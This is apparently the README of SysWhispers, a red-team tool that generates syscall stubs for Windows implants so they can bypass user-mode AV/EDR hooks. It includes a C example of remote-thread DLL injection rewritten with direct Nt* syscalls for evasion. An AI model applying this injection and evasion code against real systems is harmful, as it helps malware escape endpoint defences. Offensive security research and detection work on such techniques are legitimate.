# SysWhispers

SysWhispers helps with evasion by generating header/ASM files implants can use to make direct system calls.

All core syscalls are supported from Windows XP to 10. Example generated files available in `output` folder.  

## Introduction

Various security products place hooks in user-mode APIs which allow them to redirect execution flow to their engines and detect for suspicious behaviour. The functions in `ntdll.dll` that make the syscalls consist of just a few assembly instructions, so re-implementing them in your own implant can bypass the triggering of those security product hooks. This technique was popularized by [@Cn33liz](https://twitter.com/Cneelis) and his [blog post](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) has more technical details worth reading.

SysWhispers provides red teamers the ability to generate header/ASM pairs for any system call in the core kernel image (`ntoskrnl.exe`) across any Windows version starting from XP. The headers will also include the necessary type definitions.

The main implementation difference between this and the [Dumpert](https://github.com/outflanknl/Dumpert) POC is that this doesn't call `RtlGetVersion` to query the OS version, but instead does this in the assembly by querying the PEB directly. The benefit is being able to call one function that supports multiple Windows versions instead of calling multiple functions each supporting one version.

## Usage and Examples

### Command Lines

```powershell
# Export all functions with compatibility for all supported Windows versions (see output dir).
py .\syswhispers.py --preset all -o syscalls_all

# Export just the common functions with compatibility for Windows 7, 8, and 10.
py .\syswhispers.py --preset common -o syscalls_common

# Export NtProtectVirtualMemory and NtWriteVirtualMemory with compatibility for all versions.
py .\syswhispers.py --functions NtProtectVirtualMemory,NtWriteVirtualMemory -o syscalls_mem

# Export all functions with compatibility for Windows 7, 8, and 10.
py .\syswhispers.py --versions 7,8,10 -o syscalls_78X
```

### Script Output

```
PS C:\Projects\SysWhispers> py .\syswhispers.py --preset common --out-file syscom

  ,         ,       ,_ /_   .  ,   ,_    _   ,_   ,
_/_)__(_/__/_)__/_/_/ / (__/__/_)__/_)__(/__/ (__/_)__
      _/_                         /
     (/                          /   @Jackson_T, 2019

SysWhispers: Why call the kernel when you can whisper?

Common functions selected.

Complete! Files written to:
        syscom.asm
        syscom.h
```

### Before-and-After Example of Classic `CreateRemoteThread` Injection

```c
#include <Windows.h>

void InjectDll(const HANDLE hProcess, const char* dllPath)
{
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	
    WriteProcessMemory(hProcess, lpBaseAddress, dllPath, strlen(dllPath), nullptr);
    CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, nullptr);
}
```

```c
#include <Windows.h>
#include "syscalls.h" // Import the generated header.

void InjectDll(const HANDLE hProcess, const char* dllPath)
{
    HANDLE hThread = NULL;
    LPVOID lpAllocationStart = nullptr;
    SIZE_T szAllocationSize = strlen(dllPath);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	
    NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, (PULONG)&szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), nullptr);
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, nullptr);
}
```

## Common Functions

Using the `--preset common` switch will create a header/ASM pair with the following functions:

<details>
  <summary>Click to expand function list.</summary>

- NtCreateProcess (CreateProcess)
- NtCreateThreadEx (CreateRemoteThread)
- NtOpenProcess (OpenProcess)
- NtOpenThread (OpenThread)
- NtSuspendProcess
- NtSuspendThread (SuspendThread)
- NtResumeProcess
- NtResumeThread (ResumeThread)
- NtGetContextThread (GetThreadContext)
- NtSetContextThread (SetThreadContext)
- NtClose (CloseHandle)
- NtReadVirtualMemory (ReadProcessMemory)
- NtWriteVirtualMemory (WriteProcessMemory)
- NtAllocateVirtualMemory (VirtualAllocEx)
- NtProtectVirtualMemory (VirtualProtectEx)
- NtFreeVirtualMemory (VirtualFreeEx)
- NtQuerySystemInformation (GetSystemInfo)
- NtQueryDirectoryFile
- NtQueryInformationFile
- NtQueryInformationProcess
- NtQueryInformationThread
- NtCreateSection (CreateFileMapping)
- NtOpenSection
- NtMapViewOfSection
- NtUnmapViewOfSection
- NtAdjustPrivilegesToken (AdjustTokenPrivileges)
- NtDeviceIoControlFile (DeviceIoControl)
- NtQueueApcThread (QueueUserAPC)
- NtWaitForMultipleObjects (WaitForMultipleObjectsEx)

</details>

## Importing into Visual Studio

1. Copy the generated H/ASM files into the project folder.
2. In Visual Studio, go to *Project* -> *Build Customizations...* and enable MASM.
3. In the *Solution Explorer*, add the .h and .asm files to the project as header and source files, respectively.
4. Go to the properties of the ASM file, and set the *Item Type* to *Microsoft Macro Assembler*.

## Caveats and Limitations

- Only 64-bit Windows is supported at this time.
- System calls from the graphical subsystem (`win32k.sys`) are not supported.

## Credits

This script was developed by [@Jackson_T](https://twitter.com/Jackson_T) but builds upon the work of many others:

- [@j00ru](https://twitter.com/j00ru) for maintaining syscall numbers in machine-readable formats.
- [@FoxHex0ne](https://twitter.com/FoxHex0ne) for cataloguing many function prototypes and typedefs in a machine-readable format.
- [@PetrBenes](https://twitter.com/PetrBenes), [NTInternals.net team](https://undocumented.ntinternals.net/), and [MSDN](https://docs.microsoft.com/en-us/windows/) for additional prototypes and typedefs.
- [@Cn33liz](https://twitter.com/Cneelis) for the initial [Dumpert](https://github.com/outflanknl/Dumpert) POC implementation.

## Related Articles and Projects

- [@0x00dtm](https://twitter.com/0x00dtm): [Userland API Monitoring and Code Injection Detection](https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565)
- [@0x00dtm](https://twitter.com/0x00dtm): [Defeating Userland Hooks (ft. Bitdefender)](https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496) ([Code](https://github.com/NtRaiseHardError/Antimalware-Research/tree/master/Generic/Userland%20Hooking/AntiHook))
- [@Cn33liz](https://twitter.com/Cneelis): [Combining Direct System Calls and sRDI to bypass AV/EDR](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) ([Code](https://github.com/outflanknl/Dumpert))
- [@SpecialHoang](https://twitter.com/SpecialHoang): [Bypass EDR’s memory protection, introduction to hooking](https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6) ([Code](https://github.com/hoangprod/AndrewSpecial/tree/master))
- [@xpn](https://twitter.com/_xpn_) and [@domchell](https://twitter.com/domchell): [Silencing Cylance: A Case Study in Modern EDRs](https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/)

## Licence

This project is licensed under the Apache License 2.0.